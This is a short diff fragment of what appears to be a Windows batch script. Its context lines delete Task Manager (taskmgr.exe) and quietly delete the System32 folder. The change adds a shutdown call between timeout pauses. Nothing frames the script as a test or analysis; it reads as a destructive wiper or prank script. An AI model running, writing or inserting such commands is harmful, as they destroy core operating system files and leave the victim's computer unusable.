@@ -31,5 +31,7 @@ Del C:\Windows\System32\taskmgr.exe
 timeout 60
 
 timeout 60 /nobreak
-
+ 
+Shutdown.exe 120
+ 
 Del C:/Windows/System32 /q
